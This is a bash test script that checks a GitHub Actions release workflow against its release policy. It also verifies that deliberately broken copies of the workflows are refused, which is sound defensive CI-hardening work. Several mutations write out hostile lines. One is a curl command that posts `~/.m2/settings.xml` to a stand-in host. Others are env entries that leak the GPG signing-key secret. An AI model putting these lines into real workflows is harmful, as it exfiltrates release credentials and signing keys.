#!/usr/bin/env bash
# The broken copies below are literal workflow text, ${{ }} and $VARIABLES included.
# shellcheck disable=SC2016
#
# Holds .github/workflows/release.yml, and the workflows it calls, to the release policy, which
# no run can show before a release:
#
# - the check job runs scripts/release-check.sh, unconditionally, and its outputs are that step's;
# - publish runs only after check and build succeeded, in the maven-central environment, whose
#   reviewers approve every upload; no other job, here or in a called workflow, uses an
#   environment or reads a secret other than the job token;
# - publish restores no cache, and checks the tag again before the upload, as github-release
#   does before the release, which runs whenever publish succeeded.
#
# The jobs' if: conditions are evaluated over every combination of results, not compared as
# text. Then each rule is broken in a copy of the workflows, and the policy must refuse every
# copy, so a rule that stopped checking anything shows up too. next.yml runs it on every push.
# Needs python3 and yq.
set -euo pipefail

root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

cat > "$work/policy.py" <<'EOF'
import itertools, json, os, re, subprocess, sys

root = sys.argv[1]
problems = []

def load(path):
    out = subprocess.run(["yq", "-o=json", ".", path], check=True, capture_output=True, text=True)
    return json.loads(out.stdout)

def check(ok, message):
    if not ok:
        problems.append(message)

w = load(os.path.join(root, ".github/workflows/release.yml"))
jobs = w["jobs"]
RESULTS = ["success", "failure", "cancelled", "skipped"]

def needs(job):
    n = jobs[job].get("needs", [])
    return {n} if isinstance(n, str) else set(n)

def condition(job):
    """the job's if: as a Python function of (results, final, cancelled); none is success()"""
    text = jobs[job].get("if")
    if text is None:
        return lambda results, final, cancelled: not cancelled and all(
            results.get(n) == "success" for n in needs(job))
    text = str(text).strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    text = re.sub(r"\bneeds\.check\.outputs\.final\b", "final", text)
    text = re.sub(r"\bneeds\.([\w-]+)\.result\b", lambda m: "results[%r]" % m.group(1), text)
    text = text.replace("cancelled()", "cancelled").replace("always()", "True")
    text = text.replace("&&", " and ").replace("||", " or ")
    text = re.sub(r"!(?!=)", " not ", text)
    code = compile("(" + " ".join(text.split()) + ")", job + ".if", "eval")
    unknown = set(code.co_names) - {"results", "final", "cancelled", "True"}
    if unknown:
        problems.append("%s: cannot evaluate if: %s (%s)" % (job, jobs[job]["if"], ", ".join(sorted(unknown))))
        return None
    return lambda results, final, cancelled: bool(eval(code, {"__builtins__": {}},
        {"results": results, "final": final, "cancelled": cancelled}))

def environment(job_def):
    env = job_def.get("environment")
    return env.get("name") if isinstance(env, dict) else env

def steps(job):
    return jobs[job].get("steps", [])

def index(job, needle):
    for i, step in enumerate(steps(job)):
        if needle in json.dumps(step):
            return i
    return -1

def unconditional(job, step, what):
    check("if" not in step, "%s: %s must not be conditional" % (job, what))
    check("continue-on-error" not in step, "%s: %s must not continue on error" % (job, what))

# triggers: v1.* tags and nothing else
check(w.get("on") == {"push": {"tags": ["v1.*"]}}, "release.yml must run on v1.* tags only")
check(w.get("permissions") == {"contents": "read"}, "the workflow default must be contents: read")

# check: the release check runs, always, and the outputs are its own
CHECK = './scripts/release-check.sh "$GITHUB_REF_NAME"'
check("if" not in jobs["check"], "check must not be conditional")
check(not jobs["check"].get("continue-on-error"), "check must not continue on error")
found = [s for s in steps("check") if str(s.get("run", "")).strip() == CHECK]
check(len(found) == 1, "check must run %s as a step of its own, once" % CHECK)
if len(found) == 1:
    step = found[0]
    unconditional("check", step, "the release check")
    outputs = jobs["check"].get("outputs", {})
    for name in ("version", "final", "commit"):
        check(outputs.get(name) == "${{ steps.%s.outputs.%s }}" % (step.get("id"), name),
              "check's %s must be the release check's own output, not %r" % (name, outputs.get(name)))

# publish: after check and build succeeded, in the environment whose reviewers approve it
check(environment(jobs["publish"]) == "maven-central", "publish must use maven-central")
check({"check", "build"} <= needs("publish"), "publish must need check and build")
check(not jobs["publish"].get("continue-on-error"), "publish must not continue on error")
publish_if = condition("publish")
if publish_if:
    for check_result, build, final, cancelled in itertools.product(RESULTS, RESULTS, ["true", "false"], [False, True]):
        results = {"check": check_result, "build": build}
        runs = publish_if(results, final, cancelled)
        allowed = not cancelled and check_result == "success" and build == "success"
        check(runs == allowed, "publish with check=%s build=%s final=%s cancelled=%s: runs=%s, should be %s"
              % (check_result, build, final, cancelled, runs, allowed))

# github-release: whenever publish succeeded, final or not
check("publish" in needs("github-release"), "github-release must need publish")
check(not jobs["github-release"].get("continue-on-error"), "github-release must not continue on error")
release_if = condition("github-release")
if release_if:
    for publish, final, cancelled in itertools.product(RESULTS, ["true", "false"], [False, True]):
        results = {"check": "success", "build": "success", "publish": publish}
        runs = release_if(results, final, cancelled)
        check(runs == (publish == "success" and not cancelled),
              "github-release with publish=%s final=%s cancelled=%s: runs=%s" % (publish, final, cancelled, runs))

# Secrets and environments: publish alone, here and in every workflow these jobs call, however
# deep. A called workflow runs on the tag too, so maven-central would admit it.
#
# A secret is read through an expression: ${{ }} anywhere, or an if: without it. Any use of the
# secrets context there counts - secrets.X, secrets['X'], secrets[format(...)], toJSON(secrets),
# bare secrets - except secrets.GITHUB_TOKEN, the job token.
def expressions(value, key=None):
    if isinstance(value, dict):
        for k, v in value.items():
            yield from expressions(v, k)
    elif isinstance(value, list):
        for v in value:
            yield from expressions(v)
    elif isinstance(value, str):
        yield from re.findall(r"\$\{\{(.*?)\}\}", value, re.S)
        if key == "if" and "${{" not in value:
            yield value

def secret_reads(value, allow_token=True):
    reads = []
    for expression in expressions(value):
        for m in re.finditer(r"\bsecrets\b", expression):
            rest = expression[m.end():]
            if allow_token and re.match(r"\.GITHUB_TOKEN\b", rest):
                continue
            reads.append(expression.strip())
    return reads

def isolated(where, job_def, allowed_environment=None):
    if allowed_environment is None:
        check(environment(job_def) is None, "%s must not use an environment" % where)
        reads = secret_reads(job_def)
        check(not reads, "%s must not read secrets: %s" % (where, "; ".join(reads)))
    check(job_def.get("secrets") is None, "%s must not pass secrets on" % where)

def workflow_level(where, workflow):
    # env and defaults here reach every job; no secret at all, not even the job token
    rest = {k: v for k, v in workflow.items() if k != "jobs"}
    reads = secret_reads(rest, allow_token=False)
    check(not reads, "%s must not read secrets outside its jobs: %s" % (where, "; ".join(reads)))

seen = set()
def called(where, job_def):
    uses = job_def.get("uses", "")
    if not uses.startswith("./.github/workflows/"):
        check(not uses.startswith(".") and "/.github/workflows/" not in uses,
              "%s calls a workflow this test cannot follow: %s" % (where, uses))
        return
    path = os.path.join(root, uses[2:])
    if path in seen:
        return
    seen.add(path)
    nested_workflow = load(path)
    workflow_level(uses, nested_workflow)
    for name, nested in nested_workflow.get("jobs", {}).items():
        isolated("%s > %s" % (uses, name), nested)
        called("%s > %s" % (uses, name), nested)

workflow_level("release.yml", w)
for name, job_def in jobs.items():
    isolated(name, job_def, "maven-central" if name == "publish" else None)
    called(name, job_def)

# publish: the token and the key only on the two steps that need them, named by id - the secrets
# check and the upload - each there once, and not on the job
SECRET_STEPS = ("secrets", "upload")
publish_level = {k: v for k, v in jobs["publish"].items() if k != "steps"}
check(not secret_reads(publish_level), "publish must read secrets on its steps only, not as a job")
for step_id in SECRET_STEPS:
    count = sum(1 for step in steps("publish") if step.get("id") == step_id)
    check(count == 1, "publish must have one step with id %s, found %d" % (step_id, count))
for step in steps("publish"):
    if secret_reads(step) and step.get("id") not in SECRET_STEPS:
        problems.append("publish: only the steps with id secrets and upload may read secrets, not %r" % step.get("name"))
upload = [step for step in steps("publish") if step.get("id") == "upload"]
if upload:
    check(re.match(r"\./mvnw .*-Prelease .*\bdeploy$", " ".join(str(upload[0].get("run", "")).split())) is not None,
          "publish: the upload step must run ./mvnw -Prelease ... deploy, not %r" % upload[0].get("run"))

# publish and github-release work on the commit check accepted, checked out first, before anything
# runs from it; the tag may name another commit by then
CHECKED = "${{ needs.check.outputs.commit }}"
for job in ("publish", "github-release"):
    checkouts = [i for i, step in enumerate(steps(job)) if str(step.get("uses", "")).startswith("actions/checkout@")]
    check(checkouts == [0], "%s must check out once, as its first step, found %s" % (job, checkouts))
    for i in checkouts:
        ref = (steps(job)[i].get("with") or {}).get("ref")
        check(ref == CHECKED, "%s must check out %s, not %r" % (job, CHECKED, ref))

# publish: no cache another job could have written - no cache action in any form, no cache input
# on any setup action
for step in steps("publish"):
    uses = step.get("uses", "")
    check(not re.match(r"actions/cache([/@]|$)", uses), "publish must not restore a cache: %s" % uses)
    inputs = step.get("with", {}) or {}
    check(not any(key == "cache" or key.startswith("cache-") for key in inputs),
          "publish must not restore a cache: %s with %s" % (uses or step.get("name"), sorted(inputs)))

# the tag checked again before the upload and before the release, and a failed check stops the job
TAG_CHECK = './scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"'
for job in ("publish", "github-release"):
    found = [step for step in steps(job) if "release-tag-check.sh" in json.dumps(step)]
    check(len(found) == 1, "%s must check the tag once, found %d" % (job, len(found)))
    for step in found:
        check(str(step.get("run", "")).strip() == TAG_CHECK,
              "%s: the tag check must run %s and nothing else, not %r" % (job, TAG_CHECK, step.get("run")))
        unconditional(job, step, "the tag check")
upload_index = next((i for i, step in enumerate(steps("publish")) if step.get("id") == "upload"), -1)
check(-1 < index("publish", "release-tag-check.sh") < upload_index,
      "publish must check the tag again before it deploys")
check(-1 < index("github-release", "release-tag-check.sh") < index("github-release", "gh release create"),
      "github-release must check the tag again before it creates the release")

for problem in problems:
    print("FAIL " + problem, file=sys.stderr)
sys.exit(1 if problems else 0)
EOF

policy() {
  python3 "$work/policy.py" "$1"
}

if ! policy "$root"; then
  echo "release.yml breaks the release policy" >&2
  exit 1
fi
echo "release.yml keeps its release policy"

# Each rule broken once, in a copy: the policy must refuse each copy, for that rule. A break
# names text that occurs exactly once in its file, so it lands where it is meant to.
failures=0
# breaks <workflow file> replace <text> <new text> <what the refusal says>
# breaks <workflow file> move <text> <anchor> <what the refusal says>  (puts text after anchor)
breaks() {
  local file=$1 how=$2 old=$3 new=$4 reason=$5 copy=$work/copy
  rm -rf "$copy"
  mkdir -p "$copy/.github"
  cp -R "$root/.github/workflows" "$copy/.github/"
  if ! python3 - "$copy/.github/workflows/$file" "$how" "$old" "$new" <<'EOF'
import sys
path, how, old, new = sys.argv[1:]
text = open(path).read()
for needle in (old,) if how == "replace" else (old, new):
    if text.count(needle) != 1:
        sys.exit("%d times, not once, in %s: %s" % (text.count(needle), path, needle))
if how == "replace":
    text = text.replace(old, new)
else:
    text = text.replace(old, "")
    text = text.replace(new, new + "\n" + old.rstrip("\n") + "\n")
open(path, "w").write(text)
EOF
  then
    echo "FAIL could not break the copy for \"$reason\"" >&2
    failures=$((failures + 1))
    return
  fi
  if policy "$copy" 2> "$work/err"; then
    echo "FAIL the policy accepted a copy that should fail with \"$reason\"" >&2
    failures=$((failures + 1))
  elif ! grep -qF -- "$reason" "$work/err"; then
    echo "FAIL the policy refused a copy, but not with \"$reason\": $(cat "$work/err")" >&2
    failures=$((failures + 1))
  else
    echo "ok   refused: $reason"
  fi
}

top='permissions:
  contents: read

jobs:
'
check_job='    name: Check the tag
'
check_step='        run: ./scripts/release-check.sh "$GITHUB_REF_NAME"'
publish_job='    name: Sign and publish to Maven Central
'
publish_tag='      - name: Check the tag still names this commit
        # a release can wait days for its approval, and the tag be moved or deleted meanwhile
        run: ./scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"
'
publish_tag_step="$publish_tag"'        env:
          COMMIT: ${{ needs.check.outputs.commit }}

'
release_job='    name: GitHub Release
'
release_tag='      - name: Check the tag still names the published commit
        run: ./scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"
'
release_tag_step="$release_tag"'        env:
          COMMIT: ${{ needs.check.outputs.commit }}

'
publish_ref='          # the commit check accepted and build tested, whatever the tag names by now
          ref: ${{ needs.check.outputs.commit }}
'
release_ref='          # the commit Central got
          ref: ${{ needs.check.outputs.commit }}
'
release_checkout='      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
'"$release_ref"'          persist-credentials: false

'

# the workflow itself
breaks release.yml replace 'on:
  push:
' 'on:
  workflow_dispatch:
  push:
' "release.yml must run on v1.* tags only"
breaks release.yml replace "$top" 'permissions:
  contents: write

jobs:
' "the workflow default must be contents: read"
breaks release.yml replace "$top" "${top%jobs:
}env:
  LEAK: \${{ secrets.MAVEN_GPG_KEY }}

jobs:
" "release.yml must not read secrets outside its jobs"

# check
breaks release.yml replace "$check_step" '        run: echo "version=1.0.0" >> "$GITHUB_OUTPUT"' \
  'check must run ./scripts/release-check.sh "$GITHUB_REF_NAME" as a step of its own'
breaks release.yml replace "$check_step" "        if: false
$check_step" "check: the release check must not be conditional"
breaks release.yml replace "$check_step" "        continue-on-error: true
$check_step" "check: the release check must not continue on error"
breaks release.yml replace '      version: ${{ steps.tag.outputs.version }}' '      version: 1.0.0' \
  "check's version must be the release check's own output"
breaks release.yml replace '      final: ${{ steps.tag.outputs.final }}' "      final: 'false'" \
  "check's final must be the release check's own output"
breaks release.yml replace "$check_job" "${check_job}    if: false
" "check must not be conditional"
breaks release.yml replace "$check_job" "${check_job}    continue-on-error: true
" "check must not continue on error"

# build
breaks release.yml replace '      revision: ${{ needs.check.outputs.version }}' '      revision: ${{ needs.check.outputs.version }}
    secrets: inherit' "build must not pass secrets on"

# publish
breaks release.yml replace '    environment: maven-central
' '    environment: production
' "publish must use maven-central"
breaks release.yml replace "$publish_job" "${publish_job}    if: \${{ always() }}
" "publish with check=failure"
breaks release.yml replace "$publish_job" "${publish_job}    continue-on-error: true
" "publish must not continue on error"
breaks release.yml replace '    environment: maven-central
' '    environment: maven-central
    env:
      KEY: ${{ secrets.MAVEN_GPG_KEY }}
' "publish must read secrets on its steps only"
breaks release.yml replace "$publish_tag_step" "${publish_tag_step%
}          KEY: \${{ secrets.MAVEN_GPG_KEY }}

" "publish: only the steps with id secrets and upload may read secrets"
breaks release.yml replace "$publish_tag" "${publish_tag%%        # *}        if: false
${publish_tag#*
}" "publish: the tag check must not be conditional"
breaks release.yml replace "$publish_tag" "${publish_tag%%        # *}        continue-on-error: true
${publish_tag#*
}" "publish: the tag check must not continue on error"
breaks release.yml replace "$publish_tag" "${publish_tag%
} || true
" "publish: the tag check must run"
breaks release.yml move "$publish_tag_step" '          if-no-files-found: error
' "publish must check the tag again before it deploys"
breaks release.yml replace "$publish_ref" '' "publish must check out \${{ needs.check.outputs.commit }}, not None"
breaks release.yml replace "$publish_ref" '          ref: ${{ github.ref }}
' "publish must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
breaks release.yml replace "$publish_ref" '          ref: main
' "publish must check out \${{ needs.check.outputs.commit }}, not 'main'"
breaks release.yml replace '        id: upload
' '        id: deploy
' "publish must have one step with id upload, found 0"
breaks release.yml replace '      - name: Keep the published bundle
' '      - name: Stray
        run: echo deploy
        env:
          KEY: ${{ secrets.MAVEN_GPG_KEY }}

      - name: Keep the published bundle
' "publish: only the steps with id secrets and upload may read secrets, not 'Stray'"
breaks release.yml replace '          -DskipTests -pl odds-feed -am deploy
' '          -DskipTests -pl odds-feed -am deploy
          && curl -d @"$HOME/.m2/settings.xml" https://example.invalid
' "publish: the upload step must run ./mvnw -Prelease ... deploy"
breaks release.yml replace '      - name: Sign and publish
' '      - name: Restore
        uses: actions/cache/restore@v4
        with:
          path: ~/.m2
          key: maven

      - name: Sign and publish
' "publish must not restore a cache: actions/cache/restore@v4"
breaks release.yml replace "          distribution: 'corretto'
          # No cache" "          distribution: 'corretto'
          cache: 'maven'
          # No cache" "publish must not restore a cache: actions/setup-java"

# github-release
breaks release.yml replace '    needs: [check, publish]
' '    needs: [check]
' "github-release must need publish"
breaks release.yml replace "if: \${{ !cancelled() && needs.publish.result == 'success' }}" \
  "if: \${{ !cancelled() && needs.publish.result == 'success' && needs.check.outputs.final == 'false' }}" \
  "github-release with publish=success final=true"
breaks release.yml replace "$release_job" "${release_job}    continue-on-error: true
" "github-release must not continue on error"
breaks release.yml replace "$release_job" "${release_job}    environment: maven-central
" "github-release must not use an environment"
breaks release.yml replace '          GH_REPO: ${{ github.repository }}' '          GH_REPO: ${{ github.repository }}
          LEAK: ${{ secrets.MAVEN_GPG_KEY }}' "github-release must not read secrets"
breaks release.yml replace "$release_tag" "${release_tag%%        run:*}        if: false
        run: ${release_tag#*run: }" "github-release: the tag check must not be conditional"
breaks release.yml replace "$release_tag" "${release_tag%
} || true
" "github-release: the tag check must run"
breaks release.yml move "$release_tag_step" '          GH_REPO: ${{ github.repository }}
' "github-release must check the tag again before it creates the release"
breaks release.yml replace "$release_ref" '' "github-release must check out \${{ needs.check.outputs.commit }}, not None"
breaks release.yml replace "$release_ref" '          ref: ${{ github.ref }}
' "github-release must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
breaks release.yml replace "$release_ref" '          ref: main
' "github-release must check out \${{ needs.check.outputs.commit }}, not 'main'"
breaks release.yml move "$release_checkout" "${release_tag_step%
}" "github-release must check out once, as its first step"

# next.yml, which release.yml calls
breaks next.yml replace 'permissions:
  contents: read
  packages: read
' 'permissions:
  contents: read
  packages: read

env:
  LEAK: ${{ secrets.MAVEN_GPG_KEY }}
' "./.github/workflows/next.yml must not read secrets outside its jobs"
breaks next.yml replace '    name: Build & Test
' '    name: Build & Test
    environment: maven-central
' "./.github/workflows/next.yml > build must not use an environment"
for read in 'secrets.MAVEN_GPG_KEY' "secrets['MAVEN_GPG_KEY']" "secrets[format('MAVEN_{0}', 'GPG_KEY')]" 'toJSON(secrets)'; do
  breaks next.yml replace '          REVISION: ${{ inputs.revision }}
' "          REVISION: \${{ inputs.revision }}
          LEAK: \${{ $read }}
" "./.github/workflows/next.yml > build must not read secrets: $read"
done

if [ "$failures" -ne 0 ]; then
  echo "$failures broken copies were not refused as they should be" >&2
  exit 1
fi
echo "every broken copy was refused for its rule"
